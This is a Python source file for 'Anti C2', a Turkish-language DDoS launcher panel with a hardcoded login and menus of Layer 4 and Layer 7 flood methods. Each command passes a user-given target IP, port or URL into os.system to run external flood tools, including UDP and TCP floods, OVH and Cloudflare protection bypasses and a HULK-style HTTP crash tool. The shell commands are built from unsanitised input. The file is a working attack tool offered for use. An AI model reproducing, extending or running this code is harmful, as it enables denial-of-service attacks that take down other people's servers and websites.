

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
       /\      
      /  \     
     | () |
      \  /       
       \/         








    ''')
    time.sleep(0.3)
    clear()
    print(f'''



       /\      
      /  \     
     | () |
      \  /       
       \/         


    ''')
    time.sleep(0.3)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.3)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$51%&66%$#=-'   
          | ;  :|     
 _____.,-#%&5$@1%#&7#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mAnti \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Anti PN! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Antilag \x1b[38;2;0;255;255m')
    print("")
    
def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudpbypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mflux              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"         \x1b]2;Anti C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mAnti \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Anti C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Antilag \x1b[38;2;0;255;255m')
    print("")
    print("""
                        \x1b[38;2;255;255;255m          ┏┓ \x1b[38;2;255;255;255m    \x1b[38;2;192;192;192m   \x1b[38;2;192;192;192m • 
                \x1b[38;2;255;255;255m╔═══════════════  ┣┫ \x1b[38;2;255;255;255m ┏┓ \x1b[38;2;192;192;192m ╋ \x1b[38;2;192;192;192m ┓   ══════════════╗
                \x1b[38;2;255;255;255m║                 ┛┗ \x1b[38;2;255;255;255m ┛┗ \x1b[38;2;192;192;192m ┗ \x1b[38;2;192;192;192m ┗                 ║
\x1b[38;2;0;139;139m╔═══════════\x1b[38;2;0;139;139m════════\x1b[38;2;0;139;139m═══════\x1b[38;2;0;139;139m═════\x1b[38;2;0;139;139m═════\x1b[38;2;0;139;139m════════════════════════════════════════════════╗
\x1b[38;2;0;255;255m║     \x1b[38;2;239;239;239mYola çıktığınızı, yolda bulduğunuzla değişirseniz kaybeden siz olursunuz..   \x1b[38;2;0;255;255m  ║
\x1b[38;2;0;139;139m╚═══════════\x1b[38;2;0;139;139m════════\x1b[38;2;0;139;139m═══════\x1b[38;2;0;139;139m═════\x1b[38;2;0;139;139m═════\x1b[38;2;0;139;139m════════════════════════════════════════════════╝
                \x1b[38;2;139;0;139m╔═══════════\x1b[38;2;139;0;139m════════\x1b[38;2;139;0;139m═══════\x1b[38;2;139;0;139m═════\x1b[38;2;139;0;139m═════\x1b[38;2;139;0;139m══════════╗
            \x1b[38;2;255;0;255m   ║   \x1b[38;2;239;239;239m  Bütün komutları görmek için Help yazınız.\x1b[38;2;255;0;255m  ║
                \x1b[38;2;139;0;139m╚═══════════\x1b[38;2;139;0;139m════════\x1b[38;2;139;0;139m═══════\x1b[38;2;139;0;139m═════\x1b[38;2;139;0;139m═════\x1b[38;2;139;0;139m══════════╝
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;255;255;255m╔══[C2\x1b[38;2;255;0;0m@A\x1b[38;2;255;165;0mn\x1b[0mT\x1b[38;2;255;192;203m]
\x1b[38;2;192;192;192m╚\x1b[38;2;192;192;192m═\x1b[38;2;192;192;192m═\x1b[38;2;192;192;192m═\x1b[38;2;192;192;192m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Kullanım: udpbypass <ip> <port>')
                print('Örnek: udpbypass 1.1.1.1 80')


        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Kullanım: flux <ip> <port> <threads>')
                print('Örnek: flux 1.1.1.1 80 250')

        
        
        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Kullanım: home <ip> <port> <packet_size> <time>')
                print('Örnek: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Kullanım: udp <ip> <port>')
                print('Örnek: udp 1.1.1.1 80')

        
        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Kullanım: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Örnek: tcp GET 1.1.1.1 80 60 8500')
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Kullanım: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Örnek: ovh-beam GET 51.38.92.223 80 60')
 

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Kullanım: http-raw <url> <time>')
                print('Örnek: http-raw http://Örnek.com 60')


        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Kullanım: cf-bypass <url> <time> <threads>')
                print('Örnek: cf-bypass http://Örnek.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Kullanım: uambypass <url> <time> <req_per_ip>')
                print('Örnek: uambypass http://Örnek.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Kullanım: crash <url> METHODS<GET/POST>')
                print('Örnek: crash http://Örnek.com GET')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Kullanım: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Örnek: ovh-raw GET 1.1.1.1 80 60 8500')


        elif "help" in cnc:
            print(f'''
LAYER7  ► LAYER7 METHODLARINI GÖSTERİR
LAYER4  ► LAYER4 METHODLARINI GÖSTERİR
CLEAR   ► TERMINALI TEMİZLER
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Komut: [ " + cmmnd + " ] Bulunamadı!")
            except IndexError:
                pass


def login():
    clear()
    user = "anti"
    passwd = "anti"
    username = input("🔥 Kullanıcı adın: ")
    password = getpass.getpass(prompt='🔥 Şifre: ')
    if username != user or password != passwd:
        print("")
        print("🔥 Güzel denemeydi..")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🔥 Welcome to Anti C2!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
